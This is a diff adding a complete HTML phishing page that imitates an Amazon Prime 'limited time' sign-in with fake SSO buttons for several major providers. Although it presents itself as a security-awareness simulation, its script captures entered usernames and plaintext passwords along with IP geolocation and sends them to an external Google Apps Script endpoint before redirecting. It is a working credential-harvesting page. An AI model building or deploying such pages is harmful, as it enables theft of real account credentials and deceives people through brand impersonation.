@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <!-- Corrected viewport meta tag for proper mobile scaling -->
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Limited time offer! Sign in to your account. Expires in 15 Minutes! login to claim your free upgrade to Amazon Prime now.</title>
+  
+  <!-- Added green lock icon for the browser tab -->
+  <link rel="icon" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2322c55e"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>'>
+
+  <!-- Added Google Font 'Inter' for a modern look -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      /* Define color palette for easy changes */
+      --bg-dark: #111827; /* Dark blue-gray */
+      --bg-light: #1f2937; /* Lighter dark gray for cards */
+      --border-color: #374151;
+      --text-primary: #f9fafb; /* White/off-white */
+      --text-secondary: #d1d5db; /* Light gray */
+      --text-tertiary: #9ca3af; /* Medium gray */
+      --accent-blue: #2563eb;
+      --button-secondary-bg: #4b5563;
+      --info-bg: #1e40af;
+      --info-border: #2563eb;
+      --info-text: #e0f2fe;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: var(--bg-dark); /* Modern dark background */
+      color: var(--text-secondary);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .responsive-image {
+      width: 100%;
+      max-width: 1000px;
+      height: auto;
+      display: block;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      /* Blend the image into the dark theme */
+      opacity: 0.7;
+      filter: grayscale(30%);
+    }
+
+    .portal-box {
+      background: var(--bg-light); /* Dark card background */
+      border: 1px solid var(--border-color); /* Subtle border */
+      border-radius: 8px;
+      padding: 30px 40px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2); /* Deeper shadow for dark mode */
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    
+    .portal-box h2 { 
+      margin-top:0; 
+      font-weight:600; 
+      color: var(--text-primary); /* Light text for heading */
+      font-size: 1.5rem;
+      white-space: nowrap;
+    }
+
+    /* Removed duplicate h2#title, this style block targets the remaining one */
+
+    .sso-options { display:flex; flex-direction:column; gap:12px; margin-top:18px; }
+    
+    .sso-button { 
+      display:flex; 
+      align-items:center; 
+      justify-content:center; 
+      padding:12px; 
+      border-radius:6px; 
+      border:1px solid var(--border-color);
+      text-decoration:none; 
+      color: var(--text-primary);
+      font-weight:600; 
+      cursor:pointer; 
+      background: var(--border-color); /* Darker button background */
+      transition: background-color 0.2s ease-in-out;
+    }
+
+    .sso-button:hover {
+      background: var(--button-secondary-bg); /* Hover effect */
+    }
+
+    .sso-button img { width:22px; height:22px; margin-right:10px; }
+    
+    #loginForm { display:none; margin-top:18px; text-align:left; }
+    
+    .form-row { margin-bottom:12px; }
+    
+    label { 
+      display:block; 
+      font-size:0.9rem; 
+      color: var(--text-secondary); /* Light label text */
+      margin-bottom:6px; 
+    }
+    
+    input[type="text"], input[type="password"], input[type="email"] { 
+      width:100%; 
+      padding:10px; 
+      border-radius:6px; 
+      border:1px solid var(--border-color);
+      box-sizing:border-box; 
+      background: var(--bg-dark); /* Dark input field */
+      color: var(--text-primary);
+    }
+    
+    input[type="text"]::placeholder, 
+    input[type="password"]::placeholder, 
+    input[type="email"]::placeholder {
+      color: var(--text-tertiary); /* Lighter placeholder text */
+    }
+
+    .btn { 
+      display:inline-block; 
+      margin-top:8px; 
+      padding:10px 14px; 
+      border-radius:6px; 
+      background: var(--accent-blue); /* Modern accent blue */
+      color: var(--text-primary);
+      font-weight:700; 
+      border:none; 
+      cursor:pointer;
+      transition: background-color 0.2s ease-in-out;
+    }
+
+    .btn:hover {
+      filter: brightness(1.1);
+    }
+
+    #cancelBtn {
+      background: var(--button-secondary-bg);
+      color: var(--text-primary);
+      margin-left: 8px;
+    }
+    
+    #training-message { 
+      display:none; 
+      margin-top:18px; 
+      padding:14px; 
+      background: var(--info-bg); /* Modern info box */
+      border:1px solid var(--info-border);
+      border-radius:6px; 
+      color: var(--info-text);
+      text-align:left; 
+    }
+    
+    #training-message h3 {
+      margin-top: 0;
+      color: #fff;
+    }
+
+    small.note { 
+      display:block; 
+      color: var(--text-tertiary); /* Lighter note text */
+      margin-top:8px; 
+      font-size:0.85rem; 
+    }
+
+    /* Media query for mobile devices */
+    @media (max-width: 480px) {
+      body {
+        padding: 10px; /* Reduce padding on small screens */
+      }
+      .portal-box {
+        padding: 30px 20px; /* Reduce horizontal padding */
+      }
+    }
+  </style>
+
+</head>
+<body>
+
+  <!-- Image moved inside the body and class added for responsive styling -->
+  <img src="https://m.media-amazon.com/images/G/01/oasis/portal/amazon_access/landing_page/HERO_cg_1500x400_English.jpg" alt="amazon.com" class="responsive-image">
+
+  <div class="portal-box" role="main" aria-labelledby="title">
+    <!-- Removed duplicate h2 tag -->
+    <h2 id="title">Claim Your Free Amazon Prime</h2>
+
+    <!-- SSO options (HTML is unchanged, except for fixed icon SVGs) -->
+    <div class="sso-options" id="sso-selection">
+      
+      <a href="#" class="sso-button" data-provider="Microsoft">
+        <img alt="Microsoft" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMyAyMyIgd2lkdGg9IjIzIiBoZWlnaHQ9IjIzIj48cGF0aCBmaWxsPSIjZjNmM2YzIiBkPSJNMCAwaDIzdjIzSDB6Ii8+PHBhdGggZmlsbD0iI2YzNTMyNSIgZD0iTTEgMWgxMHYxMEgxeiIvPjxwYXRoIGZpbGw9IiM4MWJjMDYiIGQ9Ik0xMiAxaDEwdjEwSDEyeiIvPjxwYXRoIGZpbGw9IiMwNWE2ZjAiIGQ9Ik0xIDEyaDEwdjEwSDF6Ii8+PHBhdGggZmlsbD0iI2ZmYmEwOCIgZD0iTTEyIDEyaDEwdjEwSDEyeiIvPjwvc3ZnPg=="/>
+        Sign in with Microsoft
+      </a>
+      
+      <!-- FIXED Google Icon SVG -->
+      <a href="#" class="sso-button" data-provider="Google">
+        <img alt="Google" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCIgd2lkdGg9IjQ4cHgiIGhlaWdodD0iNDhweCI+PHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTQzLjg4MiAyNGM2IDIuMTk2LS4zMjYgNC4zOTItMS4wNzEgNi4zMzZoLTE4LjQyVjE5LjY3aDkuODA5Yy0uODc0IDIuMzctMi4zNzEgNC4yMi00LjI4IDUuNTYybjAgMGwtLjA1Ni4zNDV2Ni44NTNsNi4yNTIgNC44NDZjMy4zMzYtMy4zNzIgNS44OTktOC4zMDEgNS44OTktMTMuOTYyIi8+PHBhdGggZmlsbD0iI0ZCRUI1MyIgZD0iTTYuMTQxIDI5LjU2MWExMy40ODcgMTMuNDg3IDAgMCAwIDAgLTExLjEyNEwzLjE4NSA5Ljk5LS4wNTIgMTMuNDE4QzEuNTMgMTguMTM0LTEuNSAyOC4wNDcgNS4wNDEgMzYuMTA5YzUuNTA5IDYuODU2IDE0LjMwMiAxMC43MTggMjMuNDIgMTAuNzE4IDcuNjgyIDAgMTQuMTEyLTIuMzcgMTkuMDk3LTYuNzE4bC02LjE3Ny00Ljc3NWMtMi43NzIgMS43OTMtNi4zMSAzLjE4LTExLjI3MyAzLjE4LTcuNDE4IDAtMTMuMTk3LTMuNTkxLTE1LjkyMy04Ljg2MnoiLz48cGF0aCBmaWxsPSIjRjE0MzM2IiBkPSJNNDMuODgyIDI0YzAtLjg2Ny0uMDc5LTEuNjk3LS4yMTgtMi41MWgtMTkuMjczdjkuNjU1aDExLjA3OWMtLjQ3MiAyLjI5Ny0xLjk2NyA0LjQ3Ny00LjAxNiA2LjExOHY2LjU1NmEzLjg2MyAzLjg2MyAwIDAgMCAuMTQ1LjExNGw2LjE4Ni00LjgxMWMzLjYyNC0zLjU2MiA1Ljc5OC04Ljc4NyA1Ljc5OC0xNC45ODR6Ii8+PHBhdGggZmlsbD0iIzRFNzgzOCIgZD0iTTE4LjM5MyA0Ny4xMDFjMi41NDgtLjA2OCA0Ljg4LS42OCA3LjAxMS0xLjYyN2w2LjE3NyA0Ljc3NUMyOC40NjQgNTIuNjA0IDIyLjYwOCA1NAAxNS44MzkgNTRjLTEwLjc2MSAwLTIwLjAwMi01Ljc5OC0yNS40MTctMTQuNzg3bDUuNTY1LTYuNTM5YzMuMDcgNS4zOSA4Ljc3MSA4Ljg5OCAxNS4zNjQgOC44OTggMS43MTIgMCAzLjM1OC0uMjY3IDQuODgyLS43Njd6Ii8+PHBhdGggZmlsbD0iIzE5NzNFNSIgZD0iTTQyLjI1OCAxMC43OTlMMzYuMDgxIDE1LjU3NWMtMi4zNDQtMS42NTMtNC44ODMtMi42MzMtNy42NzItMi42MzMtNi41OTUgMC0xMi4yOTIgMy41MDktMTUuMzY3IDguOTAzTDIuNDg2IDUuMzE3QzcuODk5LTEuOTQzIDE3LjIzMy01LjMyNyAyNi45OTYtNC44NjUgMzQuMTYgLTMuODQ1IDQwLjA3MiAuOTM5IDQ0Ljk1IDYuMDQ2Yy43MDkuNzIgMS4zNzggMS40NzYgMS45OTEgMi4yNThhMTMuNTQgMTMuNTQgMCAwIDEtNC42ODMgMi40OTV6Ii8+PC9zdmc+"/>
+        Sign in with Google
+      </a>
+      
+      <a href="#" class="sso-button" data-provider="LinkedIn"><img alt="LinkedIn" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwNzdiYiI+PHBhdGggZD0iTTIwLjQ0NyAyMC40NTJoLTMuNTUzdi01LjU2OWMwLTEuMzI4LS4wMjctMy4wMzctMS44NTItMy4wMzdzLTIuMTM2IDEuNDQ1LTIuMTM2IDIuOTM5djUuNjY3SDkuMzU1VjkuMGg0LjM0OXYxLjM2MWguMDYyYzEuMDMxLTEuNzM2IDIuNDk0LTMuNTUzIDQuMjg3LTMuNTUzIDQuNTgxIDAgNS40MjQgMy4wMTMgNS44MjQgNi45MjZ2Ny45NzV6TTUuMjIgNy41NmEwLjAxIDAuMDEgMCAwIDEtLjAyMS4wMDFoLS4wMjFjLTEuMjMgMC0yLjIyLTEtMi4yMi0yLjIyYTEuNjYgMS42NiAwIDAgMSAxLjY2LTEuNjZjMS4yMyAwIDIuMjIgMSAyLjIyIDIuMjJjMCAxLjIyLTEuMjMgMi4yMi0yLjIyIDIuMjJ6TTAuMDIgMjAuNDUyaDQuMzQ5VjkuMGgtNC4zNDlWMjAuNDUyeiIvPjwvc3ZnPg=="/>Sign in with LinkedIn</a>
+      
+      <a href="#" class="sso-button" data-provider="GitHub"><img alt="GitHub" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI0ZGRkZGRiI+PHBhdGggZD0iTTEyIDBDNS4zNzMgMCAwIDUuMzczIDAgMTJjMCA1LjMwMyAzLjQzOCA5LjgwNSA4LjIwNSAxMS4zODUuNi4xMTMuODI4LS4yNTkuODI4LS41NzcgMC0uMjg1LS4wMS0xLjA0LS4wMTUtMi4wNC0zLjM0LjcyNS00LjA0LTEuNjEtNC4wNC0xLjYxLS41NDYtMS4zODUtMS4zMzUtMS43NTYtMS4zMzUtMS43NTYtMS4wOS0uNzQ0LjA4Mi0uNzI5LjA4Mi0uNzI5IDEuMjA1Ljg0IDEuODM4IDIuMDYyIDEuODM4IDIuMDYyIDEuMDcgMS44MzMgMi44MSAxLjMwMyAzLjQ5My45OTguMTEtLjc3Ni40MTgtMS4zMDMuNzYtMS42MDVDNy42NDUgMTguOTU1IDQuNTEgMTcuOTk0IDQuNTEgMTIuNzYyYzAtMS42MTIuNTc1LTIuOTI1IDEuNTA1LTMuOTU1LS4xNTUtLjc3Ni0uNjUyLTIuNTIuMTQ1LTMuOTAgMCAwIDEuMDE1LS4zMjUgMy4zMyAyLjAwN0EyMy4yNiAyMy4yNiAwIDAgMSAxMiA4LjA4NWMxLjAxNS4wMDMgMi4wMy4xMzYgMy4wMDQuNDA2IDIuMzE0LTIuMzMyIDMuMzI1LTIuMDA3IDMuMzI1LTIuMDA3Ljc5NyAxLjM4LTMgMy4xMjQtLjE0NSAzLjkuOTMgMS4wMyAxLjUwNSA5LjM0MyAxLjUwNSA5Ljk1NCAwIDUuMjQ0LTMuMTM1IDYuMTg1LTUuOTIgNi4yNTUuNDMuMzcxLjgyIDEuMS44MiAyLjIyNiAwIDEuNjA1LS4wMTUgMi45LS4wMTUgMy4yOTYgMCAuMzIxLjIyOC42OTQuODI4LjU3NkMyMC41NjUgMjEuODA1IDI0IDE3LjMwMyAyNCAxMmMwLTYuNjI3LTUuMzczLTEyLTEyLTEyeiIvPjwvc3ZnPg=="/>Sign in with GitHub</a>
+      
+      <!-- FIXED X (Twitter) Icon SVG -->
+      <a href="#" class="sso-button" data-provider="X (Twitter)">
+        <img alt="X" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwcHgiIGhlaWdodD0iNTBweCIgZmlsbD0iI0ZGRkZGRiI+PHBhdGggZD0iTTQwLjE5OSw0Mi4zMiBMNS4yNjIsNS45NjMgOS4xMzcsNS45NjMgMzYuODE1LDMyLjExMiA0NS43MzYsMjEuMTU5IDQ5LjYxMSwyMS4xNTkgMzYuNDM4LDM4LjE3OCAyOC41MjYsNDcuMDM3IDI0LjY1LDQ3LjAzNyAzNy4yMTgsMjkuNzI4IEw0MC4xOTksNDIuMzIgeiBNMzguMjEsMzkuMjEgTDguODg3LDguMDgxIDMzLjEyNCwzNi41NTYgMzguMjEsMzkuMjEgeiBNMjYuNTE3LDIyLjI3OCBMMzMuOTIsMzQuNjY3IDIxLjA0NSw0LjEwMiAxMy40MTUsMTYuNzIgTDI2LjUxNywyMi4yNzcgeiIvPjwvc3ZnPg=="/>
+        Sign in with X
+      </a>
+
+      <a href="#" class="sso-button" data-provider="Facebook">
+        <img alt="Facebook" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdmMiI+PHBhdGggZD0iTTIyLjY3NSAwaC0yMS4zNWMtLjczMiAwLTEuMzI1LjU5My0xLjMyNSAxLjMyNXYyMS4zNWMwIC43My41OTMgMS4zMjUgMS4zMjUgMS4zMjVoMTEuNjkzdi05LjE5NmgtMy4xMjh2LTMuNjIySDEyLjk5OFY5LjU5NGMwLTMuMjI1IDIuMTYtNS4wMjIgNC45My01LjAyMmgzLjM5OXYzLjYyN2gtMi4wNDFjLTEuMjQxIDAtMS40ODUuNTkxLTEuNDg1IDEuNDU4djIuNTE2aDMuNzA1bC0uNDg3IDMuNjIySDE3Ljc5OXY5LjE5Nmg0Ljg3OGMuNzMyIDAgMS4zMjUtLjU5MyAxLjMyNS0xLjMyNXYtMjEuMzVjMC0uNzMyLS41OTMtMS4zMjUtMS4zMjUtMS4zMjV6Ii8+PC9zdmc+"/>
+        Sign in with Facebook
+      </a>
+      <a href="#" class="sso-button" data-provider="Instagram">
+        <img alt="Instagram" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSI+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjMiIHgyPSIxOS41IiB5MT0iMjEuMDAxIiB5Mj0iNC41MDEiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2Y2YzkzNyIvPjxzdG9wIG9mZnNldD0iLjMxIiBzdG9wLWNvbG9yPSIjZTU3NzA2Ii8+PHN2Z1Agb2Zmc2V0PSIuOTg5IiBzdG9wLWNvbG9yPSIjZDc0MjcyIi8+PC9saW5lYXJHcmFkaWVudD48cGF0aCBmaWxsPSJ1cmwoI2dyYWQpIiBkPSJNMTIgMEM4LjcyMSAwIDUuMjMyIDAgMS45NDEgMS45NDFDMCA1LjMyOSAwIDguNzIxIDAgMTJjMCAzLjI3OSAwIDYuNjcxIDEuOTQxIDguMDU5QzUuMjMyIDI0IDguNzIxIDI0IDEyIDI0YzMuMjc5IDAgNi42NzEtLjAwMSA4LjA1OS0xLjk0MUMyNCAyMC4xNzEgMjQgMTcuMjc5IDI0IDEyYzAtMy4yNzkgMC02LjY3MS0xLjk0MS04LjA1OUMyMC42NzEgMCAxNy4yNzkgMCAxMiAwek05LjgwOSA1Ljg5NGMuNjQ4LS4wMDIgMS4zMTUtLjAwNCAxLjk5MS0uMDA0IDIuMDY3IDAgMy4yODIgMS4yIDEzLjMwOCAzLjM0OS4wMzEuNTk5LjAzIDEuMjAzLjAyNyAxLjgxLS4wMDQuNjA4LS4wMDYgMS4yMzItLjAwNiAxLjg1MS0uMDAyLjYxOS0uMDAyIDEuMjg4LS4wMDYgMS44ODgtLjAxNiAyLjM4NS0xLjM2MSA0LjA1Mi0zLjM4MSA0LjEzMi0uNTg5LjAyMS0xLjE4LjA0Mi0xLjc2OC4wNDItLjU5MyAwLTEuMTkyLS4wMjEtMS43ODItLjA0MmMtMi4xMzYtLjA4LTMuNzQ1LTEuNzU1LTMuODIxLTQuMDM3LS4wMzYtMS4xNzgtLjAzNi0yLjM2MS0uMDM2LTMuNTM4QzUuOTk5IDEwLjA5NSA2LjAwNSA3LjQ1IDkuODA5IDUuODk0em04LjAyMiA5LjI1MWMuNzc3LS4wOTMuOTIyLS4xNjYuOTIyLS45OTQtLjAwMi0uODQyLS4xMy0uOTk2LS44OTctMS4wMS0xLjA3LS4wMDgtMy4zNjQtLjAwOC00Ljg5NS0uMDA4LTEuNDQxIDAtMy42NTIgMC00Ljc0OS4wMDgtLjc5LjAwMi0uOTYyLjE3NC0uOTYyIDEuMDQtLjAwMS44OTkuMTkyIDEuMDQgMS4xIDEuMDRjMS4zODQtLjAwMyAzLjQyOS0uMDAzIDQuNzAzLS4wMDMuMzg2IDAgMS4yMjItLjAwNCAxLjc4LS4wMzd6bS01LjYyNC02LjM1MmE1Ljg0OSA1Ljg0OSAwIDAxLTUuNzggNS45MTNjLjAwNSAzLjI2IDEuOTA4IDUuNTg5IDUuNzggNS41ODlzNS43NzQtMi4xNzcgNS43NzQtNS41ODljLjAwNS0zLjI5My0yLjExMS01LjkxMy01Ljc3NC01LjkxM3ptLTUuMzgyIDUuODgzYzAgMi4xMzUuNjggMy44NjMgNS4zODIgMy44NjMgNC42NTIgMCA1LjM2NC0xLjcwMyA1LjM2NC0zLjgxNyAwLTIuMTM2LS43MS0zLjg2My01LjM2NC0zLjgxNy00LjcwNSAwLTUuMzgyIDEuNjc4LTUuMzgyIDMuODE3ek01LjkyIDExLjEzYTMuMjc5IDMuMjc5IDAgMDAuMDAxLTEuMDI5Yy4zNzQtLjg2NyAxLjU0Mi0xLjMyIDMuMTMxLTEuMzIgMS4yOTcgMCAzLjAwOC4xMTYgMy4xNDguOTk0QzEyLjA2MyA4Ljk3IDEwLjc0NSA5LjYwNCA5LjY0OCAxMC42MzdjLTEuMTU3IDEuMDgzLTEuNjQ0IDIuMDU4LTEuNjQ0IDMuOTM1cy41MSA0LjAxIDMuMDI4IDQuMDM3YzEuMDIxLjAxIDMuMTMyLjA0IDQuNTIuMDQzLjYyMyAwIDEuMjUuMDAyIDEuODgzLjAwNi44MjQuMDA1IDEuNDUzLS4wMDggMS45OTMtLjExMy0uNzYzLjg1My0xLjkxNyAxLjIyMy0zLjEzMSAxLjIyMy0yLjg5MSAwLTQuNjcyLTEuODIzLTQuNjcyLTMuNjQ4cy4xNjgtMi43NTkuMzk4LTMuNDkyek0xOC4xMDYgNy44NTdhMS4zMSAxLjMxIDAgMDAtMS4zMS0xLjMxYy0uNzIzIDAtMS4zMS41ODctMS4zMSAxLjMxIDAgLjcyMy41ODcgMS4zMSAxLjMxIDEuMzFzMS4zMS0uNTg3IDEuMzEtMS4zMXoiLz48L3N2Zz4="/>
+        Sign in with Instagram
+      </a>
+    </div>
+
+    <!-- Login form -->
+    <form id="loginForm" autocomplete="off" novalidate>
+      <h3 id="formTitle" style="margin:0 0 8px 0">Sign in</h3>
+      <div class="form-row">
+        <label for="username">Work email or username</label>
+        <input id="username" name="username" type="email" placeholder="Email Address" required />
+        <small class="note">Login to claim your free Amazon Prime Membership.</small>
+      </div>
+      <div class="form-row">
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" placeholder="Password" />
+        <small class="note"><strong></strong></small>
+      </div>
+      <button type="submit" id="submitBtn" class="btn">Submit</button>
+      <button type="button" id="cancelBtn" class="btn">Cancel</button>
+    </form>
+
+    <!-- Training message -->
+    <div id="training-message" role="status" aria-live="polite">
+      <h3>This Was a Security Test</h3>
+      <p>You were about to sign in on a simulated phishing page. We recorded that you attempted to authenticate via <strong id="providerNameDisplay"></strong>.</p>
+      <p>To improve your skills, please complete the short training that will open next.</p>
+      <p style="font-weight:bold;text-align:center;margin:0;">Redirecting to training…</p>
+    </div>
+  </div>
+
+  <script>
+    // Wait for the window to be fully loaded, including external scripts
+    window.onload = () => {
+    
+      /***********************
+       * Configuration
+       ***********************/
+      
+      // 1. PASTE YOUR GOOGLE SCRIPT URL HERE
+      const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz6LMQheNygxd5ejseXkqSTfWs1_K90Ug9uXPdLG3BBPlcIhUUbR8RuG8XadUN965WAUw/exec";
+
+      const FINAL_ENROLLMENT_URL = "https://cybersecurity-llc.github.io/cybersecurity-awareness.html";
+      const REDIRECT_DELAY = 3000; // milliseconds
+
+      // Firebase is no longer needed
+      let db = null; 
+
+      /***********************
+       * Helper: fetch geo/ip safely
+       ***********************/
+      async function fetchGeo() {
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          if (!res.ok) throw new Error('geo failed');
+          return await res.json();
+        } catch (e) {
+          return {
+            ip: 'lookup_failed',
+            city: 'lookup_failed',
+            region: 'lookup_failed',
+            country_name: 'lookup_failed',
+            org: 'lookup_failed'
+          };
+        }
+      }
+
+      /***********************
+       * NEW Helper: send to Google Script
+       ***********************/
+      async function sendToGoogleScript(payloadObj) {
+        if (SCRIPT_URL === "PASTE_YOUR_WEB_APP_URL_HERE") {
+            console.error("SCRIPT_URL is not set. Data not sent.");
+            return;
+        }
+
+        try {
+          // We must send the data as a JSON string in the body
+          const response = await fetch(SCRIPT_URL, {
+            method: 'POST',
+            mode: 'cors', // Required for cross-origin requests
+            credentials: 'omit',
+            headers: {
+              'Content-Type': 'text/plain;charset=utf-8', // Use text/plain to avoid preflight
+            },
+            body: JSON.stringify(payloadObj)
+          });
+          
+          const result = await response.json();
+          console.log("Data sent to Google Script:", result);
+
+        } catch (err) {
+          console.error('Google Script error. Check CORS or script URL.', err);
+        }
+      }
+
+      /***********************
+       * Main flow (Modified)
+       ***********************/
+      const ssoButtons = document.querySelectorAll('.sso-button');
+      const ssoSelection = document.getElementById('sso-selection');
+      const loginForm = document.getElementById('loginForm');
+      const formTitle = document.getElementById('formTitle');
+      const providerDisplay = document.getElementById('providerNameDisplay');
+      const trainingMessage = document.getElementById('training-message');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      let currentProvider = null;
+
+      ssoButtons.forEach(btn => {
+        btn.addEventListener('click', async (e) => {
+          e.preventDefault();
+          currentProvider = btn.dataset.provider || 'Unknown';
+          ssoSelection.style.display = 'none';
+          loginForm.style.display = 'block';
+          formTitle.textContent = `Sign in with ${currentProvider}`;
+          providerDisplay.textContent = currentProvider;
+          usernameInput.focus();
+        });
+      });
+
+      document.getElementById('cancelBtn').addEventListener('click', () => {
+        loginForm.style.display = 'none';
+        ssoSelection.style.display = 'flex';
+        usernameInput.value = '';
+        passwordInput.value = '';
+      });
+
+      loginForm.addEventListener('submit', async (ev) => {
+        ev.preventDefault();
+        const username = usernameInput.value ? usernameInput.value.trim() : '';
+        const password = passwordInput.value ? passwordInput.value.trim() : ''; 
+
+        const geo = await fetchGeo();
+
+        const payload = {
+          sso_attempt_provider: currentProvider,
+          username: username || '[no username provided]',
+          password: password || '[no password provided]',
+          ip_address: geo.ip,
+          city: geo.city,
+          region: geo.region,
+          country: geo.country_name,
+          isp: geo.org,
+          user_agent: navigator.userAgent
+        };
+
+        // *** THIS IS THE CHANGED LINE ***
+        // send to GOOGLE SCRIPT in background
+        sendToGoogleScript(payload).catch(() => { /* swallow errors */ });
+
+        // Show the training message & redirect
+        loginForm.style.display = 'none';
+        trainingMessage.style.display = 'block';
+        providerDisplay.textContent = currentProvider;
+
+        setTimeout(() => {
+          const url = new URL(FINAL_ENROLLMENT_URL);
+          if (username) url.searchParams.set('username', username);
+          window.location.href = url.toString();
+        }, REDIRECT_DELAY);
+      });
+
+    }; // End of window.onload
+  </script>
+</body>
+</html>
+
+
